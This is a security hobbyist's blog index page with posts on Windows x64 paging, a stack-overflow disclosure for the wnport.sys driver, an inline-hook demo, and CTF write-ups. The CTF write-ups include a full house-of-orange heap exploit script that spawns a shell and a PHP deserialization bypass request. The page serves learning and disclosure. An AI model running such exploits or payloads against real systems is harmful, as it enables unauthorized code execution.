<!DOCTYPE html>
<html lang="zh-cn" >
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<title>My Blog</title>
    <link rel="alternate" href="" type="application/atom+xml"/>
	<link rel="shortcut icon" href=""/>
	
<link rel="stylesheet" href="/css/style.css">

	
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
	<div class="main-con">

        <div class="nav cl">
    <ul class="cl nav-list">
        
            <li>
                
                    <a href="/" class="active">
                        <i class="fa fa-home"></i> 
                        <span>主页</span>
                    </a>
                
            </li>
        
            <li>
                
                    <a href="/archives/" class="">
                        <i class=" fa-"></i> 
                        <span>归档</span>
                    </a>
                
            </li>
        
    </ul>
    <ul class="cl nav-tool">
        
        
        <li>
            <a href="javascript:void(0)" class="nav-search-btn">
                <i class="fa fa-search"></i>
            </a>
        </li>
        
    </ul>
    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="nav-search"><input type="search" name="q" class="nav-search-input" placeholder="search..."><input type="hidden" name="sitesearch" value="http://b.iakb.org"></form>
</div>

        <header class="top" id="" style="background-image: url(https://www.dmoe.cc/random.php)">
    <i class="fa fa-bars" id="media-toggle" style="display: none"></i>
    <div class="top-info cl fadeToBottom">
        <h2 class="site-name"><a href="/">j1ans</a> <small id="type-data">一些笔记</small></h2>
    </div>
</header>

        <div class="con-wrap fadeToTop">
    

        

    <section class="article-area">
    
        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/08/18/windows-虚拟内存笔记/" title="windows 虚拟内存笔记">
                    windows 虚拟内存笔记
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-08-18
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <h2 id="Windows-分页"><a href="#Windows-分页" class="headerlink" title="Windows 分页"></a>Windows 分页</h2><p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818144719375.png" alt="image-20250818144719375"></p>
<p>线性地址通过4层页表变成物理地址，让CPU实际可以访问到物理地址。</p>
<p>也就是说，线性地址其实是由四层页表+偏移组合而成的</p>
<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HaHyXRfg5ia40QsKzj4Gy781DzFIx3jcd7FqjahQbOibibOcgyGxiaMN79bibJWouQERzPOKgObbic2sKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1" alt="图片"></p>
<p>线性地址组成</p>
<ul>
<li>在PML4 四级页表中的表项索引 索引内内容是 PDPT 的基地址</li>
<li>拿着得到的PDPT的基地址 与在PDPT 页目录指针表的表项索引 得到PD的基地址</li>
<li>拿着得到的PD的基地址 与在PD页目录表的表项索引 得到PT的基地址</li>
<li>拿着得到的PT的基地址 与在PT页表的表项索引 得到Page 页的基地址</li>
<li>然后拿着页的基地址+ Offset 得到真实物理地址 12位最大就是0xFFF 所以一个页通常是0x1000</li>
<li>也就是0x0-0xFFF 4KB页大小</li>
</ul>
<p>在32位系统下，windows有两种分页机制，2-9-9-12分页以及10-10-12分页，而在64位下只有一种分页机制，那就是9-9-9-9-12分页</p>
<p>在x64体系中，只有48位是用来确定虚拟地址的，前面的16位成为符号拓展位，这16位只有为全1或者为全0两种情况。除了这两种情况之外的地址都是不合法的。</p>
<p>这16位为全1时表示这个地址是一个内核空间的地址，而为全0时表示这个地址是一个用户空间的地址。而在windows操作系统中，由于种种原因，又只用了这48位线性地址中的 44位 。也就是说windows分配的线性地址前20位都是要么为全0，要么为全1</p>
<h3 id="PS位"><a href="#PS位" class="headerlink" title="PS位"></a>PS位</h3><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HaHyXRfg5ia40QsKzj4Gy781DzFIx3jcd7FqjahQbOibibOcgyGxiaMN79bibJWouQERzPOKgObbic2sKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1" alt="图片"></p>
<p>除了四级页表后的PDPTE PDE 这两个页表都可能拥有PS位 </p>
<p>PS为一般在第7位</p>
<p>在PDPTE如果PS位为1 就认为是映射1GB 大页 </p>
<ul>
<li>PD PT Offset就变成一个大的Offset 然后PDPTE是这个1GB物理大页的基地址 </li>
<li>Offset大小就是 9+9+12 &#x3D; 30位大小(PD的页表的表项索引 + PT页表的表项索引 + Offset)</li>
</ul>
<p>如果在PDE PS位为1 那么就认为是映射2MB 大页</p>
<ul>
<li>PT Offset 就变成一个大的Offset 然后PDE是这个2MB大页的基地址</li>
<li>Offset 大小就是9 +12 &#x3D; 21 位 (PT页表的表项索引 + Offset) 0x1FFFFF字节</li>
</ul>
<h3 id="CR3寄存器"><a href="#CR3寄存器" class="headerlink" title="CR3寄存器"></a>CR3寄存器</h3><ul>
<li>x64 PML4基地址存储在CR3寄存器内。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code class="hljs plaintext">00007ff8`c5810000</code></pre>

<p>011111111</p>
<p>111100011</p>
<p>000101100</p>
<p>000010000</p>
<p>000000000000</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818153333044.png" alt="image-20250818153333044"></p>
<p>CR3是1ad000</p>
<p>第一层应该就是1ad000 + 255(8个1) * 8(每一个PML4E都是寄存器大小 8 字节) &#x3D; 0x1ad7f8</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818153940511.png" alt="image-20250818153940511"></p>
<p>得到PML4E8A0000000F27C867</p>
<p>在 x64 页表中，<strong>PML4E 的高 40 位存储下一级页表（PDPT）的物理基地址</strong>，低 12 位为属性标志（如存在位、读写权限等）</p>
<table>
<thead>
<tr>
<th></th>
<th>名称</th>
<th>值</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>pdpt</td>
<td>0x8a0000000f27c000</td>
<td>unsigned __int64</td>
</tr>
</tbody></table>
<p>得到PDPT基地址 f27c000</p>
<p>然后就是 f27c000+ 1e3 * 8 &#x3D; f27cf18</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818154733555.png" alt="image-20250818154733555"></p>
<pre><code class="hljs plaintext">0a000000`0f27d867</code></pre>

<p>相同手法获得PDT 基地址 f27d000</p>
<p>000101100 &#x3D; 0x2c 然后0x2c * 8 &#x3D; 0x160</p>
<p>PT在f27d160</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155627813.png" alt="image-20250818155627813"></p>
<p>pt基地址为f27e000 + 0x80 &#x3D; f27e080</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155729388.png" alt="image-20250818155729388"></p>
<p>最终结果0xf185000</p>
<p><img src="/./windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818155755759.png" alt="image-20250818155755759"></p>
<pre><code class="hljs plaintext">Amd64VtoP: Virt 00007ff8c5810000, pagedir 00000000001ad000Amd64VtoP: PML4E 00000000001ad7f8Amd64VtoP: PDPE 000000000f27cf18Amd64VtoP: PDE 000000000f27d160Amd64VtoP: PTE 000000000f27e080Amd64VtoP: Mapped phys 000000000f185000Virtual address 7ff8c5810000 translates to physical address f185000.</code></pre>

<p>成功手算出了物理地址</p>
<h3 id="PTE-PDE"><a href="#PTE-PDE" class="headerlink" title="PTE -&gt; PDE"></a>PTE -&gt; PDE</h3><p>那么我们其实也可以反推</p>
<p>因为PTE &#x3D; </p>
<h2 id="Windows-内存管理"><a href="#Windows-内存管理" class="headerlink" title="Windows 内存管理"></a>Windows 内存管理</h2><h3 id="VAD"><a href="#VAD" class="headerlink" title="VAD"></a>VAD</h3><p>微软和Intel手册叫的不同</p>
<ul>
<li>PXE - PM4LE</li>
<li>PPE - PDPTE</li>
<li>PDE - PDE</li>
<li>PTE - PTE</li>
</ul>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" title="Wincor Nixdorf PORT IO Driver Stack Overflow">
                    Wincor Nixdorf PORT IO Driver Stack Overflow
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-06-26
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>The Wincor Nixdorf PORT IO Driver ‘wnport.sys’ was found to have multiple stack overflow vulnerabilities.</p>
<p>Driver Download Link <a target="_blank" rel="noopener" href="https://driverpack.io/en/hwids/ROOT%5CWNPORT">https://driverpack.io/en/hwids/ROOT%5CWNPORT</a></p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232106183.png" alt="image-20250626232106183"></p>
<p>The Driver ‘s <strong>Digital Signature</strong>. though it’s has not WHQL signature. is still permitted to be loaded by the latest version of Windows. However, for drivers with valid digital signatures issued before this policy update, Windows maintains compatibility by allowing them to bypass the WHQL requirement. </p>
<p>Therefore, this driver may still have an impact on the new 32-bit version of Windows.</p>
<p>The <code>IOCTL_DEVICEIO_CONTROL_FUNCTION</code> subroutine at <code>sub_11100</code> contains multiple IOCTL handlers that can trigger stack overflow conditions. Specifically, the following IOCTL codes are affected:</p>
<ul>
<li><code>0x80102040</code></li>
<li><code>0x80102044</code></li>
<li><code>0x80102050</code></li>
<li><code>0x80102054</code></li>
</ul>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232659410.png" alt="image-20250626232659410"></p>
<p>The <code>MaxCount</code> parameter actually represents the input buffer length, while <code>CommitSize</code> is constrained to a maximum of four <code>size_t</code> units. Consequently, a stack overflow will occur if the input buffer length exceeds the <code>CommitSize</code>.</p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233012724.png" alt="image-20250626233012724"></p>
<p>After using <code>DeviceIoControl</code> to send a large input buffer that exceeds the driver’s internal stack allocation , the system may encounter a stack overflow condition. This occurs because the driver’s IOCTL handler at sub_11100 processes the buffer without proper bounds checking, leading to memory corruption.</p>
<p><img src="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233051235.png" alt="image-20250626233051235"></p>
<p>This driver has triggered a <strong>PAGE_FAULT_NON_PAGE</strong> blue screen error, resulting in the system crashing., disrupting system operation by causing improper access to non-paged memory. Beyond the immediate system crash, its vulnerabilities can lead to memory corruption, enabling malicious entities to manipulate critical memory areas. In the worst - case scenario, it allows for arbitrary code execution, giving attackers the ability to run unauthorized commands with elevated privileges. What’s more concerning is that the driver’s IOCTL functions can be called by low - privileged programs, making it easier for attackers to exploit these flaws and undermine system integrity.</p>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/05/23/windows-hook-inline-hook/" title="windows hook - inline hook">
                    windows hook - inline hook
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-05-23
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>inline hook 内联钩子是一种常用的钩子</p>
<p>其原理是直接把函数开头改成一个JMP ，后跟我们的hook函数地址</p>
<p>在hook函数里就随后恢复我们的原始字节 并跳到原函数执行 随后直接再次改成JMP挂钩</p>
<p>一般来说在windows内程序代码应该都是不可写的 需要使用VirtualProtect函数来改权限</p>
<pre><code class="hljs c">BOOL
WINAPI
<span class="hljs-title function_">VirtualProtect</span><span class="hljs-params">(</span>
<span class="hljs-params">    _In_  LPVOID lpAddress,</span>
<span class="hljs-params">    _In_  SIZE_T dwSize,</span>
<span class="hljs-params">    _In_  DWORD flNewProtect,</span>
<span class="hljs-params">    _Out_ PDWORD lpflOldProtect</span>
<span class="hljs-params">    )</span>
&#123;
    <span class="hljs-keyword">return</span> VirtualProtectFromApp (lpAddress, dwSize, flNewProtect, lpflOldProtect);
&#125;</code></pre>

<p>简单的poc</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>

BYTE original_code[<span class="hljs-number">14</span>];
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hook</span><span class="hljs-params">(ULONG_PTR addr, ULONG_PTR target)</span></span>;
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unhook</span><span class="hljs-params">(ULONG_PTR addr, BYTE* original)</span></span>;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">print_custom</span><span class="hljs-params">()</span> </span>&#123;
    std::cout &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">print_hook</span><span class="hljs-params">()</span> </span>&#123;
    std::cout &lt;&lt; <span class="hljs-string">&quot;you are hooked!&quot;</span> &lt;&lt; std::endl;
    <span class="hljs-built_in">unhook</span>((ULONG_PTR)&amp;print_custom, original_code);
    <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-built_in">hook</span>((ULONG_PTR)&amp;print_custom, (ULONG_PTR)&amp;print_hook);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;



<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    ULONG_PTR print_addr = (ULONG_PTR)&amp;print_custom;
    std::cout &lt;&lt;<span class="hljs-string">&quot;[+]print_addr=&gt;&quot;</span> &lt;&lt; std::hex &lt;&lt; print_addr &lt;&lt; std::endl;
    ULONG_PTR print_hook_addr = (ULONG_PTR)&amp;print_hook;
    std::cout &lt;&lt; <span class="hljs-string">&quot;[+]print_hook=&gt;&quot;</span> &lt;&lt; std::hex &lt;&lt; print_hook_addr &lt;&lt; std::endl;

    DWORD dwOldProtect;


    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)print_addr, <span class="hljs-number">0x233</span>, <span class="hljs-number">64</span>, &amp;dwOldProtect);
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(&amp;original_code), (<span class="hljs-type">void</span>*)(print_addr), <span class="hljs-number">14</span>);
    <span class="hljs-built_in">hook</span>(print_addr, print_hook_addr);
    
    <span class="hljs-type">int</span> qwq = <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-type">int</span> qwq1 = <span class="hljs-built_in">print_custom</span>();
    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);

&#125;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hook</span><span class="hljs-params">(ULONG_PTR addr,ULONG_PTR target)</span></span>&#123;
    BYTE jmp_code[<span class="hljs-number">14</span>] = &#123;
   <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,  <span class="hljs-comment">// ; jmp qword ptr [rip + 0x0]</span>
   <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>  <span class="hljs-comment">// 后跟绝对地址</span>
    &#125;;
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)&amp;jmp_code[<span class="hljs-number">6</span>], (<span class="hljs-type">void</span>*)&amp;target, <span class="hljs-number">8</span>);
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(addr), &amp;jmp_code, <span class="hljs-number">14</span>);
&#125;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unhook</span><span class="hljs-params">(ULONG_PTR addr, BYTE* original)</span> </span>&#123;
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)addr, original, <span class="hljs-number">14</span>);
&#125;</code></pre>


        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/05/08/house-of-orange-欧润吉/" title="house of orange(欧润吉)">
                    house of orange(欧润吉)
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-05-08
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>通过溢出修改top_chunk的size从而申请比修改后的size更大的chunk来触发sys_malloc，从而把原来的top_chunk给free掉 </p>
<p>然后就可以泄露LIBC地址和堆地址了</p>
<p>unsortedbin attack 已经在新版本libc被修复了 </p>
<pre><code class="hljs C">victim = unsorted_chunks(av)-&gt;bk;  <span class="hljs-comment">// 获取最后一个 chunk</span>
bck = victim-&gt;bk;                 <span class="hljs-comment">// 获取 victim 的 bk</span>
unsorted_chunks(av)-&gt;bk = bck;    <span class="hljs-comment">// 将 unsorted bin 的 bk 指向 victim 的 bk</span>
bck-&gt;fd = unsorted_chunks(av);    <span class="hljs-comment">// 关键操作：将 victim-&gt;bk-&gt;fd 设置为 unsorted bin 头 </span></code></pre>



<p>我们可以控制最后一个chunk的bk</p>
<p>因为这个攻击是利用了 往 最后一个chunk 的 bk 的fd (bk+0x10)写入东西</p>
<p>那么只要控制bk减少0x10 就可以往我们指定的target_address 写入 main_arena+96 或者+88 (一个很大的值)</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
<p>主要就是为了控制_IO_list_all 然后控制vtable 或者chain</p>
<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-comment">#from LibcSearcher import *</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
<span class="hljs-comment">#io = remote(&quot;node5.buuoj.cn&quot;,29087)</span>
io = process(<span class="hljs-string">&quot;./orange&quot;</span>)
e = ELF(<span class="hljs-string">&#x27;./orange&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
    attach(io)

s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():
    sla(<span class="hljs-string">b&quot;Your choice : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
    sa(<span class="hljs-string">&#x27;Name :&#x27;</span>,content)
    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size,content</span>):
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
    sla(<span class="hljs-string">&#x27;Length of name :&#x27;</span>,<span class="hljs-built_in">str</span>(size))
    sa(<span class="hljs-string">&#x27;Name:&#x27;</span>,content)
    sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
    sla(<span class="hljs-string">&#x27;Color of Orange:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
    sla(<span class="hljs-string">&#x27;4.show\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
    sla(<span class="hljs-string">&#x27;index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))
    
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))

add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
edit(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xfa1</span>)) <span class="hljs-comment"># modify top_chunk</span>
add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># cut the free chunk </span>
show()
ru(<span class="hljs-string">&#x27;Name of house : &#x27;</span>)
leak_main_arena = uu64(r(<span class="hljs-number">6</span>))
dlog(<span class="hljs-string">&quot;main_arena&quot;</span>,leak_main_arena)
libc_base = leak_main_arena -<span class="hljs-number">0x5e9</span> - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
io_2_1_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]
system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
dlog(<span class="hljs-string">&quot;list_all&quot;</span>,io_2_1_list_all)
edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
show()
ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)
leak_heap_addr = uu64(r(<span class="hljs-number">6</span>))
dlog(<span class="hljs-string">&quot;heap_address&quot;</span>,leak_heap_addr)
payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span> + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>
payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(io_2_1_list_all-<span class="hljs-number">0x10</span>)<span class="hljs-comment">#unsorted bin attack</span>
payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)
payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>
payload+=p64(leak_heap_addr+<span class="hljs-number">0x530</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">10</span>
payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(leak_heap_addr+<span class="hljs-number">0x610</span>)+p64(system_addr)*<span class="hljs-number">8</span>
edit(<span class="hljs-built_in">len</span>(payload),payload)
<span class="hljs-comment">#bug()</span>
sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))


io.interactive()</code></pre>



        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-上/" title="2025/4/26 BOCCHI THE ROCK(上)">
                    2025/4/26 BOCCHI THE ROCK(上)
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>35包场咯 拿下册子+海报</p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0277.JPG" alt="IMG_0277"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0284.JPG" alt="IMG_0284"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0282.JPG" alt="IMG_0282"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0281.JPG" alt="IMG_0281"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_8005.JPG" alt="IMG_8005"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_8006.JPG" alt="IMG_8006"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0280.JPG" alt="IMG_0280"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0279.JPG" alt="IMG_0279"></p>
<p><img src="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/IMG_0278.JPG" alt="IMG_0278"></p>

        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-no-wakeup/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup">
                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
        <div class="article-description">
            
            <p>PHP反序列化函数 考察的主要是绕过_wakeup 当序列化字符串的属性个数和括号内不符就绕过了</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 

<span class="hljs-keyword">import</span> json

param = <span class="hljs-string">&quot;O%3A6%3A%22HaHaHa%22%3A3%3B%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A4%3A%22wllm%22%3B%7D&quot;</span>

url = <span class="hljs-string">f&quot;http://node7.anna.nssctf.cn:23157/class.php?p=<span class="hljs-subst">&#123;param&#125;</span>&quot;</span>

resp = requests.get(url=url)

<span class="hljs-built_in">print</span>(resp.text)</code></pre>


        </div>
        
            
        
        
    </div>
</article>

        
            <article class="article">
    <div class="article-wrap">
        
            <h2 class="article-title cl">
                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-Do-you-know-http/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http">
                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http
                </a>
            </h2>
        

        <ul class="article-extra" style="margin-bottom: 20px">
            
            <li class="article-time">
                2025-04-27
            </li>
            

            
                
            


        </ul>
